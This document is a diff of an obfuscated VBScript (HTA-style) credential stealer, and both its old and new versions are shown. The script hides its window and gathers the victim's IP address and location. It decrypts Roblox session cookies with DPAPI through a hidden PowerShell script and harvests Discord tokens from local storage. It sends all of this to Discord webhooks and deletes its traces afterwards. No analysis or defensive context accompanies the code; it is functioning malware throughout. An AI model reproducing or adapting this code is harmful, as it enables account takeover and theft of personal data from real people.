@@ -1,64 +1,132 @@
 window.resizeTo 0,0:window.moveTo -5000,-5000
 On Error Resume Next
 
-' ============= STRINGS =============
-Function W1():W1=Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(51)&Chr(51)&Chr(48)&Chr(49)&Chr(57)&Chr(56)&Chr(50)&Chr(52)&Chr(50)&Chr(55)&Chr(56)&Chr(55)&Chr(51)&Chr(50)&Chr(56)&Chr(53)&Chr(48)&Chr(47)&Chr(71)&Chr(67)&Chr(56)&Chr(111)&Chr(107)&Chr(49)&Chr(48)&Chr(77)&Chr(114)&Chr(90)&Chr(67)&Chr(89)&Chr(71)&Chr(107)&Chr(82)&Chr(108)&Chr(55)&Chr(82)&Chr(75)&Chr(72)&Chr(67)&Chr(86)&Chr(53)&Chr(89)&Chr(67)&Chr(84)&Chr(90)&Chr(49)&Chr(84)&Chr(90)&Chr(113)&Chr(80)&Chr(74)&Chr(68)&Chr(117)&Chr(52)&Chr(53)&Chr(84)&Chr(76)&Chr(80)&Chr(74)&Chr(111)&Chr(70)&Chr(78)&Chr(89)&Chr(85)&Chr(119)&Chr(69)&Chr(121)&Chr(84)&Chr(72)&Chr(56)&Chr(105)&Chr(71)&Chr(57)&Chr(89)&Chr(83)&Chr(48)&Chr(48)&Chr(75)&Chr(57)&Chr(56)&Chr(67)&Chr(119)&Chr(99)&Chr(76)&Chr(115)&Chr(117):End Function
-Function W2():W2=Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(51)&Chr(51)&Chr(48)&Chr(49)&Chr(57)&Chr(56)&Chr(49)&Chr(54)&Chr(52)&Chr(54)&Chr(48)&Chr(52)&Chr(49)&Chr(57)&Chr(50)&Chr(54)&Chr(50)&Chr(47)&Chr(109)&Chr(113)&Chr(53)&Chr(121)&Chr(82)&Chr(111)&Chr(112)&Chr(66)&Chr(101)&Chr(86)&Chr(85)&Chr(103)&Chr(75)&Chr(69)&Chr(69)&Chr(82)&Chr(51)&Chr(87)&Chr(75)&Chr(45)&Chr(99)&Chr(117)&Chr(53)&Chr(56)&Chr(102)&Chr(86)&Chr(80)&Chr(50)&Chr(89)&Chr(86)&Chr(90)&Chr(52)&Chr(112)&Chr(54)&Chr(97)&Chr(75)&Chr(117)&Chr(99)&Chr(71)&Chr(67)&Chr(110)&Chr(119)&Chr(49)&Chr(48)&Chr(104)&Chr(121)&Chr(48)&Chr(75)&Chr(85)&Chr(50)&Chr(110)&Chr(69)&Chr(84)&Chr(95)&Chr(88)&Chr(107)&Chr(74)&Chr(86)&Chr(122)&Chr(70)&Chr(119)&Chr(45)&Chr(97)&Chr(88)&Chr(110)&Chr(95)&Chr(115)&Chr(77):End Function
-
-Dim WH:WH=W1():Dim WT:WT=W2()
+Dim WH:WH=Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(51)&Chr(51)&Chr(48)&Chr(49)&Chr(57)&Chr(56)&Chr(50)&Chr(52)&Chr(50)&Chr(55)&Chr(56)&Chr(55)&Chr(51)&Chr(50)&Chr(56)&Chr(53)&Chr(48)&Chr(47)&Chr(71)&Chr(67)&Chr(56)&Chr(111)&Chr(107)&Chr(49)&Chr(48)&Chr(77)&Chr(114)&Chr(90)&Chr(67)&Chr(89)&Chr(71)&Chr(107)&Chr(82)&Chr(108)&Chr(55)&Chr(82)&Chr(75)&Chr(72)&Chr(67)&Chr(86)&Chr(53)&Chr(89)&Chr(67)&Chr(84)&Chr(90)&Chr(49)&Chr(84)&Chr(90)&Chr(113)&Chr(80)&Chr(74)&Chr(68)&Chr(117)&Chr(52)&Chr(53)&Chr(84)&Chr(76)&Chr(80)&Chr(74)&Chr(111)&Chr(70)&Chr(78)&Chr(89)&Chr(85)&Chr(119)&Chr(69)&Chr(121)&Chr(84)&Chr(72)&Chr(56)&Chr(105)&Chr(71)&Chr(57)&Chr(89)&Chr(83)&Chr(48)&Chr(48)&Chr(75)&Chr(57)&Chr(56)&Chr(67)&Chr(119)&Chr(99)&Chr(76)&Chr(115)&Chr(117)
+Dim WT:WT=Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(51)&Chr(51)&Chr(48)&Chr(49)&Chr(57)&Chr(56)&Chr(49)&Chr(54)&Chr(52)&Chr(54)&Chr(48)&Chr(52)&Chr(49)&Chr(57)&Chr(50)&Chr(54)&Chr(50)&Chr(47)&Chr(109)&Chr(113)&Chr(53)&Chr(121)&Chr(82)&Chr(111)&Chr(112)&Chr(66)&Chr(101)&Chr(86)&Chr(85)&Chr(103)&Chr(75)&Chr(69)&Chr(69)&Chr(82)&Chr(51)&Chr(87)&Chr(75)&Chr(45)&Chr(99)&Chr(117)&Chr(53)&Chr(56)&Chr(102)&Chr(86)&Chr(80)&Chr(50)&Chr(89)&Chr(86)&Chr(90)&Chr(52)&Chr(112)&Chr(54)&Chr(97)&Chr(75)&Chr(117)&Chr(99)&Chr(71)&Chr(67)&Chr(110)&Chr(119)&Chr(49)&Chr(48)&Chr(104)&Chr(121)&Chr(48)&Chr(75)&Chr(85)&Chr(50)&Chr(110)&Chr(69)&Chr(84)&Chr(95)&Chr(88)&Chr(107)&Chr(74)&Chr(86)&Chr(122)&Chr(70)&Chr(119)&Chr(45)&Chr(97)&Chr(88)&Chr(110)&Chr(95)&Chr(115)&Chr(77)
 Dim sh,fso:Set sh=CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)):Set fso=CreateObject(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116))
 Dim PC,USER:PC=sh.ExpandEnvironmentStrings(Chr(37)&"COMPUTERNAME"&Chr(37)):USER=sh.ExpandEnvironmentStrings(Chr(37)&"USERNAME"&Chr(37))
-
-' ============= WRITE COMBINED POWERSHELL =============
 Dim TMP:TMP=sh.ExpandEnvironmentStrings(Chr(37)&"TEMP"&Chr(37))
-Dim psFile:psFile=TMP&Chr(92)&"c.ps1"
-Dim resFile:resFile=TMP&Chr(92)&"c.txt"
+
+' ===== IP GRAB =====
+Dim ip,geo
+Dim xh:Set xh=CreateObject(Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48))
+xh.SetOption 2,13056
+xh.Open Chr(71)&Chr(69)&Chr(84),Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(105)&Chr(112)&Chr(105)&Chr(102)&Chr(121)&Chr(46)&Chr(111)&Chr(114)&Chr(103)&Chr(47),False
+xh.Send
+If xh.Status=200 Then
+    ip=xh.responseText
+    If Len(ip)>6 Then
+        xh.Open Chr(71)&Chr(69)&Chr(84),Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(58)&Chr(47)&Chr(47)&Chr(105)&Chr(112)&Chr(45)&Chr(97)&Chr(112)&Chr(105)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(108)&Chr(105)&Chr(110)&Chr(101)&Chr(47)&ip&Chr(63)&Chr(102)&Chr(105)&Chr(101)&Chr(108)&Chr(100)&Chr(115)&Chr(61)&Chr(99)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(114)&Chr(121)&Chr(44)&Chr(114)&Chr(101)&Chr(103)&Chr(105)&Chr(111)&Chr(110)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(44)&Chr(99)&Chr(105)&Chr(116)&Chr(121)&Chr(44)&Chr(105)&Chr(115)&Chr(112),False
+        xh.Send
+        If xh.Status=200 Then
+            geo=Split(xh.responseText,vbLf)
+            SEND WH,Chr(84)&Chr(97)&Chr(114)&Chr(103)&Chr(101)&Chr(116),Chr(73)&Chr(80)&Chr(58)&Chr(32)&ip&Chr(32)&Chr(124)&Chr(32)&geo(0)&Chr(32)&Chr(124)&Chr(32)&geo(1)&Chr(32)&Chr(124)&Chr(32)&geo(2)&Chr(32)&Chr(124)&Chr(32)&geo(3)&Chr(32)&Chr(124)&Chr(32)&Chr(80)&Chr(67)&Chr(58)&Chr(32)&PC&Chr(32)&Chr(124)&Chr(32)&USER,3447003
+        End If
+    End If
+End If
+Set xh=Nothing
+
+' ===== ROBLOX COOKIE =====
+Dim LAPP:LAPP=sh.ExpandEnvironmentStrings(Chr(37)&"LOCALAPPDATA"&Chr(37))
+Dim fp:fp=""
+Dim paths(4)
+paths(0)=LAPP&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
+paths(1)=LAPP&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
+paths(2)=LAPP&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)
+paths(3)=sh.ExpandEnvironmentStrings(Chr(37)&"APPDATA"&Chr(37))&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
+Dim i
+For i=0 To 3:If fso.FileExists(paths(i)) Then fp=paths(i):Exit For:Next
+If Len(fp)>0 Then
+    Dim raw:raw="":Dim fr:Set fr=fso.OpenTextFile(fp,1):raw=fr.ReadAll:fr.Close:Set fr=Nothing
+    If Len(raw)>20 Then
+        Dim CD:CD=Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(68)&Chr(97)&Chr(116)&Chr(97)
+        Dim b64:b64=""
+        Dim jp:jp=InStr(raw,CD&Chr(34)&Chr(58)&Chr(34))
+        If jp>0 Then jp=jp+14:Dim je:je=InStr(jp,raw,Chr(34)):If je>jp Then b64=Mid(raw,jp,je-jp)
+        If Len(b64)<50 Then
+            Dim ah:ah=InStr(raw,"AQAAANCMnd8")
+            If ah>0 Then Dim bs:bs=ah:Do While bs>1:bs=bs-1:If Mid(raw,bs,1)=Chr(34) Then bs=bs+1:Exit Do:Loop:Dim be:be=InStr(ah,raw,Chr(34)):If be>bs Then b64=Mid(raw,bs,be-bs)
+        End If
+        If Len(b64)>50 Then
+            Dim bf:bf=TMP&Chr(92)&"b.txt":Dim of:of=TMP&Chr(92)&"d.txt":Dim pf:pf=TMP&Chr(92)&"dp.ps1"
+            Dim fb:Set fb=fso.CreateTextFile(bf,True):fb.Write b64:fb.Close:Set fb=Nothing
+            Dim psObj:Set psObj=fso.CreateTextFile(pf,True)
+            psObj.WriteLine "Add-Type -AssemblyName System.Security"
+            psObj.WriteLine "try{"
+            psObj.WriteLine "  $b64=(Get-Content '"+bf+"' -Raw).Trim()"
+            psObj.WriteLine "  $bytes=[Convert]::FromBase64String($b64)"
+            psObj.WriteLine "  $dec=[System.Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
+            psObj.WriteLine "  [System.Text.Encoding]::UTF8.GetString($dec)|Out-File '"+of+"' -Encoding utf8"
+            psObj.WriteLine "}catch{$_.Exception.Message|Out-File '"+of+"'}"
+            psObj.Close:Set psObj=Nothing
+            fso.DeleteFile of,True
+            sh.Run Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34)&pf&Chr(34),0,True
+            If fso.FileExists(of) Then
+                If fso.GetFile(of).Size>0 Then
+                    Dim result:Dim fr2:Set fr2=fso.OpenTextFile(of,1):result=fr2.ReadAll:fr2.Close:Set fr2=Nothing
+                    If Len(result)>10 Then
+                        Dim cookie:cookie=""
+                        Dim ROBLO:ROBLO=Chr(46)&Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(83)&Chr(69)&Chr(67)&Chr(85)&Chr(82)&Chr(73)&Chr(84)&Chr(89)
+                        Dim rp:rp=InStr(result,ROBLO)
+                        If rp>0 Then
+                            rp=rp+15:Dim clean:clean="":Dim ci,cch,cac
+                            For ci=rp To Len(result):cch=Mid(result,ci,1):cac=Asc(cch):If cac>=32 And cac<=126 Then clean=clean&cch:If Len(clean)>2000 Then Exit For:Next
+                            If Len(clean)>20 Then cookie=clean
+                        End If
+                        Dim WARN:WARN=Chr(95)&Chr(124)&Chr(87)&Chr(65)&Chr(82)&Chr(78)&Chr(73)&Chr(78)&Chr(71)
+                        If Len(cookie)<20 Then
+                            Dim wp:wp=InStr(result,WARN)
+                            If wp>0 Then Dim wclean:wclean="":Dim wi,wch,wac:For wi=wp To Len(result):wch=Mid(result,wi,1):wac=Asc(wch):If wac>=32 And wac<=126 Then wclean=wclean&wch:If wac=34 Or wac=125 Then Exit For:If Len(wclean)>2000 Then Exit For:Next:If Len(wclean)>10 Then cookie=wclean
+                        End If
+                        If Len(cookie)<10 Then cookie=result
+                        cookie=Trim(cookie)
+                        If Len(cookie)>5 Then SEND WH,Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(32)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101),Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32)&USER&Chr(32)&Chr(124)&Chr(32)&Chr(80)&Chr(67)&Chr(58)&Chr(32)&PC&Chr(10)&cookie,65280
+                    End If
+                End If
+            End If
+            fso.DeleteFile bf,True:fso.DeleteFile pf,True:fso.DeleteFile of,True
+        End If
+    End If
+End If
+
+' ===== DISCORD TOKENS (PowerShell) =====
+Dim psFile:psFile=TMP&Chr(92)&"dt.ps1"
+Dim resFile:resFile=TMP&Chr(92)&"dt.txt"
 fso.DeleteFile resFile,True
 
-Dim ps:Set ps=fso.CreateTextFile(psFile,True)
-ps.WriteLine "$r='"&resFile&"':''|Out-File $r"
-ps.WriteLine "$WH_ROBLOX='"&WH&"':$WH_TOKEN='"&WT&"'"
-ps.WriteLine "$PC=$env:COMPUTERNAME:$USER=$env:USERNAME"
-' IP
-ps.WriteLine "try{$ip=(Invoke-RestMethod 'https://api.ipify.org' -EA Stop):$geo=Invoke-RestMethod ""http://ip-api.com/line/$ip?fields=country,regionName,city,isp"" -EA Stop:$body=@{content=""**Target**`nIP: $ip | $geo | PC: $PC | $USER""}|ConvertTo-Json:Invoke-RestMethod $WH_ROBLOX -Method Post -Body $body -ContentType 'application/json'|Out-Null}catch{}"
-' Roblox cookie
-ps.WriteLine "$LAPP=$env:LOCALAPPDATA:$fp='':$paths=@(""$LAPP\Roblox\LocalStorage\robloxcookies.dat"",""$LAPP\Roblox\LocalStorage\RobloxCookies.dat"",""$LAPP\Roblox\Cookies"",""$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat""):foreach($p in $paths){if(Test-Path $p){$fp=$p:break}}"
-ps.WriteLine "if($fp){$raw=[System.IO.File]::ReadAllText($fp):if($raw -match 'CookiesData"":""([^""]+)""'){$b64=$matches[1]}elseif($raw -match 'AQAAANCMnd8.+?(?="")'){$b64=$matches[0]}"
-ps.WriteLine "if($b64 -and $b64.Length -gt 80){Add-Type -AssemblyName System.Security:try{$bytes=[Convert]::FromBase64String($b64.Trim()):$dec=[System.Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser):$txt=[System.Text.Encoding]::UTF8.GetString($dec)}catch{$txt=''}"
-ps.WriteLine "if($txt -and $txt.Length -gt 20){if($txt -match '_\\|WARNING.+'){$cookie=$matches[0]:$cookie=$cookie -replace '[^\\x20-\\x7E]',''}:$body=@{content=""**Roblox Cookie**`nUser: $USER`nPC: $PC`n$cookie""}|ConvertTo-Json:Invoke-RestMethod $WH_ROBLOX -Method Post -Body $body -ContentType 'application/json'|Out-Null}}}"
-' Discord tokens
-ps.WriteLine "$paths=@(""$env:APPDATA\discord\Local Storage\leveldb"",""$env:APPDATA\discordcanary\Local Storage\leveldb"",""$env:APPDATA\discordptb\Local Storage\leveldb""):$re=[regex]'M[A-Za-z\\d_-]{23,}\\.[A-Za-z\\d_-]{6,}\\.[A-Za-z\\d_-]{27,}':$seen=@{}"
-ps.WriteLine "foreach($p in $paths){if(!(Test-Path $p)){continue}:gci $p -Filter '*.ldb' -EA 0|%{$c=[System.IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8):foreach($m in $re.Matches($c)){$t=$m.Value:if($seen[$t]){continue}:$seen[$t]=$true:try{$u=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{Authorization=$t} -EA Stop:""$t|$($u.username)|$($u.email)|$($u.id)""|Out-File $r -Append -Encoding utf8}catch{}}}}"
-ps.WriteLine "gci $p -Filter '*.log' -EA 0|%{$c=[System.IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8):foreach($m in $re.Matches($c)){$t=$m.Value:if($seen[$t]){continue}:$seen[$t]=$true:try{$u=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{Authorization=$t} -EA Stop:""$t|$($u.username)|$($u.email)|$($u.id)""|Out-File $r -Append -Encoding utf8}catch{}}}}"
-ps.Close:Set ps=Nothing
+Set psObj=fso.CreateTextFile(psFile,True)
+psObj.WriteLine "$o='"+resFile+"':''|Out-File $o"
+psObj.WriteLine "$paths=@('$env:APPDATA\\discord\\Local Storage\\leveldb','$env:APPDATA\\discordcanary\\Local Storage\\leveldb','$env:APPDATA\\discordptb\\Local Storage\\leveldb')"
+psObj.WriteLine "$re=[regex]'M[A-Za-z\\d_-]{23,}\\.[A-Za-z\\d_-]{6,}\\.[A-Za-z\\d_-]{27,}':$seen=@{}"
+psObj.WriteLine "foreach($p in $paths){if(!(Test-Path $p)){continue}:gci $p -Filter '*.ldb' -EA 0|%{$c=[System.IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8):foreach($m in $re.Matches($c)){$t=$m.Value:if($seen[$t]){continue}:$seen[$t]=$true:try{$u=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{Authorization=$t} -EA Stop:""$t|$($u.username)|$($u.email)|$($u.id)""|Out-File $o -Append -Encoding utf8}catch{}}}:gci $p -Filter '*.log' -EA 0|%{$c=[System.IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8):foreach($m in $re.Matches($c)){$t=$m.Value:if($seen[$t]){continue}:$seen[$t]=$true:try{$u=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{Authorization=$t} -EA Stop:""$t|$($u.username)|$($u.email)|$($u.id)""|Out-File $o -Append -Encoding utf8}catch{}}}}"
+psObj.Close:Set psObj=Nothing
 
 sh.Run Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34)&psFile&Chr(34),0,True
 
-' Read token results
 If fso.FileExists(resFile) Then
-    Dim tokens:Set fr=fso.OpenTextFile(resFile,1):tokens=fr.ReadAll:fr.Close:Set fr=Nothing
-    If Len(tokens)>5 Then
-        Dim lines:lines=Split(tokens,vbCrLf)
-        Dim line,p,info
+    Dim dtRaw:Set fr=fso.OpenTextFile(resFile,1):dtRaw=fr.ReadAll:fr.Close:Set fr=Nothing
+    If Len(dtRaw)>5 Then
+        Dim lines:lines=Split(dtRaw,vbCrLf)
+        Dim line,token,uname,email,uid
         For Each line In lines
             If Len(line)>20 Then
-                p=Split(line,Chr(124))
-                If UBound(p)>=3 Then
-                    info=Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32)&p(1)&vbCrLf
-                    If p(2)<>"" Then info=info&Chr(69)&Chr(109)&Chr(97)&Chr(105)&Chr(108)&Chr(58)&Chr(32)&p(2)&vbCrLf
-                    info=info&Chr(73)&Chr(68)&Chr(58)&Chr(32)&p(3)&vbCrLf
-                    info=info&Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110)&Chr(58)&Chr(32)&p(0)
-                    SendEmbed WT,Chr(68)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(32)&Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110),info,5793266
+                Dim parts:parts=Split(line,Chr(124))
+                If UBound(parts)>=3 Then
+                    token=parts(0):uname=parts(1):email=parts(2):uid=parts(3)
+                    Dim info:info=Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32)&uname&vbCrLf
+                    If email<>"" Then info=info&Chr(69)&Chr(109)&Chr(97)&Chr(105)&Chr(108)&Chr(58)&Chr(32)&email&vbCrLf
+                    info=info&Chr(73)&Chr(68)&Chr(58)&Chr(32)&uid&vbCrLf
+                    info=info&Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110)&Chr(58)&Chr(32)&token
+                    SEND WT,Chr(68)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(32)&Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110),info,5793266
                 End If
             End If
         Next
     End If
 End If
-
 fso.DeleteFile psFile,True:fso.DeleteFile resFile,True
 window.close()
 
-Sub SendEmbed(wh,title,desc)
+Sub SEND(wh,title,desc)
     Dim DQ:DQ=Chr(34)
     title=Replace(title,Chr(92),Chr(92)&Chr(92)):title=Replace(title,DQ,Chr(92)&DQ)
     desc=Replace(desc,Chr(92),Chr(92)&Chr(92)):desc=Replace(desc,DQ,Chr(92)&DQ):desc=Replace(desc,vbCrLf,Chr(92)&Chr(110)):desc=Replace(desc,vbCr,Chr(92)&Chr(110)):desc=Replace(desc,vbLf,Chr(92)&Chr(110))
